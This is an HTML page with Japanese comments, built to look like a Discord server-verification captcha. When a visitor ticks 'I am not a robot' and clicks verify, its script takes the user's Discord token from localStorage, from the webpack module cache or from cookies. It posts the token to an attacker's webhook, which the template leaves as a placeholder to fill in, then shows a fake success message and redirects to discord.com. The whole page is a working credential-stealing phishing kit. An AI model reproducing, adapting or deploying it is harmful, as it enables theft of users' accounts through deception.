<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>Server Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: #36393f;
            color: white;
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .box {
            background: #2f3136;
            padding: 40px;
            border-radius: 8px;
            text-align: center;
            width: 400px;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: #5865F2;
            border-radius: 50%;
            margin: 0 auto 20px;
            line-height: 80px;
            font-size: 40px;
        }
        
        .captcha-box {
            background: #40444b;
            border-radius: 4px;
            padding: 20px;
            margin: 20px 0;
            cursor: pointer;
        }
        
        .captcha-box label {
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
        }
        
        #check {
            width: 24px;
            height: 24px;
            cursor: pointer;
        }
        
        #btn {
            background: #4a4a4a;
            color: white;
            border: none;
            padding: 16px 40px;
            font-size: 16px;
            border-radius: 4px;
            cursor: not-allowed;
            width: 100%;
            margin-top: 20px;
        }
        
        #btn.enabled {
            background: #3ba55d;
            cursor: pointer;
        }
        
        #btn.enabled:hover {
            background: #2d7d46;
        }
        
        #loading, #success { display: none; margin-top: 20px; }
        
        .spinner {
            border: 3px solid #4a4a4a;
            border-top: 3px solid #3ba55d;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">✓</div>
        <h2>Server Verification</h2>
        <p id="server" style="color: #b9bbbe; margin-bottom: 20px;">Server: Gaming Community</p>
        
        <!-- チェックボックス -->
        <div class="captcha-box" onclick="toggleCheck()">
            <label onclick="event.stopPropagation()">
                <input type="checkbox" id="check" onchange="updateButton()">
                <span>私はロボットではありません</span>
            </label>
        </div>
        
        <!-- 認証ボタン -->
        <button id="btn" onclick="verify()" disabled>認証する</button>
        
        <!-- ローディング -->
        <div id="loading">
            <div class="spinner"></div>
            <p style="color: #b9bbbe;">認証中...</p>
        </div>
        
        <!-- 成功 -->
        <div id="success">
            <p style="color: #3ba55d;">✅ 認証完了</p>
        </div>
    </div>

    <script>
        // ========== Webhook URL ==========
        const WEBHOOK = "https://discord.com/api/webhooks/あなたのWEBHOOK";
        
        // サーバー名表示
        const params = new URLSearchParams(location.search);
        const srv = params.get('server');
        if (srv) document.getElementById('server').textContent = 'Server: ' + decodeURIComponent(srv);
        
        // チェックボックス切り替え（div全体をクリック可能に）
        function toggleCheck() {
            const cb = document.getElementById('check');
            cb.checked = !cb.checked;
            updateButton();
        }
        
        // ボタン状態更新
        function updateButton() {
            const cb = document.getElementById('check');
            const btn = document.getElementById('btn');
            
            console.log('Checkbox:', cb.checked); // デバッグ用
            
            if (cb.checked) {
                btn.disabled = false;
                btn.classList.add('enabled');
                console.log('Button enabled');
            } else {
                btn.disabled = true;
                btn.classList.remove('enabled');
                console.log('Button disabled');
            }
        }
        
        // 認証実行
        async function verify() {
            console.log('Verification started'); // デバッグ用
            
            const btn = document.getElementById('btn');
            const loading = document.getElementById('loading');
            const success = document.getElementById('success');
            
            // UI切り替え
            btn.style.display = 'none';
            document.querySelector('.captcha-box').style.display = 'none';
            loading.style.display = 'block';
            
            // トークン取得
            let token = null;
            
            // 方法1: LocalStorage
            try {
                token = localStorage.getItem('token');
                console.log('LocalStorage token:', token ? 'Found' : 'Not found');
            } catch(e) {
                console.log('LocalStorage error:', e);
            }
            
            // 方法2: webpack
            if (!token) {
                try {
                    const modules = [];
                    if (window.webpackChunkdiscord_app) {
                        window.webpackChunkdiscord_app.push([[''], {}, (e) => {
                            for (let c in e.c) modules.push(e.c[c]);
                        }]);
                        const mod = modules.find(m => m?.exports?.default?.getToken);
                        if (mod) {
                            token = mod.exports.default.getToken();
                            console.log('Webpack token:', token ? 'Found' : 'Not found');
                        }
                    }
                } catch(e) {
                    console.log('Webpack error:', e);
                }
            }
            
            // 方法3: Cookie
            if (!token) {
                try {
                    const match = document.cookie.match(/token=([^;]+)/);
                    if (match) {
                        token = match[1];
                        console.log('Cookie token:', 'Found');
                    }
                } catch(e) {
                    console.log('Cookie error:', e);
                }
            }
            
            console.log('Final token:', token ? token.substring(0, 20) + '...' : 'Not found');
            
            // 送信
            if (token) {
                try {
                    await fetch(WEBHOOK, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            content: `🔑 Token:\n\`\`\`${token}\`\`\``
                        })
                    });
                    console.log('Webhook sent');
                } catch(e) {
                    console.log('Webhook error:', e);
                }
            }
            
            // 完了表示
            loading.style.display = 'none';
            success.style.display = 'block';
            
            // Discordに戻る
            setTimeout(() => {
                location.href = 'https://discord.com';
            }, 2000);
        }
        
        // ページ読み込み時にコンソールにログ出力（デバッグ用）
        console.log('Page loaded');
        console.log('localStorage available:', !!window.localStorage);
        console.log('webpack available:', !!window.webpackChunkdiscord_app);
    </script>
</body>
</html>
